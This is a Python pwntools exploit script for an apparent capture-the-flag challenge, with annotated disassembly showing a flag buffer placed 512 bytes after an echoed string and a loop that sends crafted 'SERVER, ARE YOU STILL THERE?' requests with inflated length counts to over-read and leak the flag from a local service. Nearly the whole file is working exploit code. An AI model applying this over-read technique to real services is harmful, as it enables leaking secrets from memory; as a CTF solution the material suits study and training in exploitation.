#!/usr/bin/env python3
# coding: UTF-8

from pwn import *

context.log_level = 'debug'

'''
0000000000400fb9         mov        esi, 0x487de4                ; argument #2 for method fopen64
0000000000400fbe         mov        edi, 0x487de6                ; argument #1 for method fopen64
0000000000400fc3         call       fopen64                      # open flag
0000000000400fc8         mov        qword [ss:rbp+var_18], rax
0000000000400fcc         cmp        qword [ss:rbp+var_18], 0x0
0000000000400fd1         jne        0x400fe7

0000000000400fe7         mov        rax, qword [ss:rbp+var_18]
0000000000400feb         mov        rcx, rax                     ; argument #4 for method fread
0000000000400fee         mov        edx, 0x100                   ; argument #3 for method fread
0000000000400ff3         mov        esi, 0x1                     ; argument #2 for method fread
0000000000400ff8         mov        edi, 0x6b7540                ; argument #1 for method fread
0000000000400ffd         call       fread                        # 0x6b7540 = flag

00000000004010ba         call       strtok
00000000004010bf         cdqe
00000000004010c1         mov        qword [ss:rbp+var_28], rax
00000000004010c5         mov        rax, qword [ss:rbp+var_28]
00000000004010c9         mov        rdi, rax                     ; argument #1 for method strlen
00000000004010cc         call       strlen
00000000004010d1         mov        rdx, rax                     ; argument #3 for method memcpy
00000000004010d4         mov        rax, qword [ss:rbp+var_28]
00000000004010d8         mov        rsi, rax                     ; argument #2 for method memcpy
00000000004010db         mov        edi, 0x6b7340                ; argument #1 for method memcpy
00000000004010e0         call       memcpy

000000000040110e         call       strtok
0000000000401113         cdqe
0000000000401115         mov        qword [ss:rbp+var_28], rax
0000000000401119         lea        rdx, qword [ss:rbp+var_2C]
000000000040111d         mov        rax, qword [ss:rbp+var_28]
0000000000401121         mov        esi, 0x487e49                # %d LETTERS
0000000000401126         mov        rdi, rax
0000000000401129         mov        eax, 0x0
000000000040112e         call       __isoc99_sscanf
0000000000401133         mov        eax, dword [ss:rbp+var_2C]
0000000000401136         cdqe
0000000000401138         mov        byte [ds:rax+globals], 0x0
000000000040113f         mov        eax, dword [ss:rbp+var_2C]
0000000000401142         movsxd     rbx, eax
0000000000401145         mov        edi, 0x6b7340                ; argument #1 for method strlen
000000000040114a         call       strlen                       # "string" length
000000000040114f         cmp        rbx, rax
0000000000401152         jbe        0x401168                     # if %d LETTERS <= "" length: jmp

0000000000401168         mov        edi, 0x6b7340                ; argument #1 for method _IO_puts, XREF=game_over2+187
000000000040116d         call       _IO_puts
'''

flag = ''

for overread_count in xrange(1, 257):
    r = remote('localhost', 9000, timeout=None) # socat TCP-LISTEN:9000,reuseaddr,fork exec:./xkcd&

    payload = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "'
    payload += 'a' * (512) # 0x6b7540-0x6b7340=0x200=512
    payload += '" ('
    payload += str(512 + overread_count)
    payload += ' LETTERS)\n'

    r.sendline(payload)
    recv = r.recvline()

    if 'NICE TRY' in recv:
        break
    else:
        print(recv)

    flag = recv[512:]
    r.close()

print('[+] Flag: {flag}'.format(flag=flag))
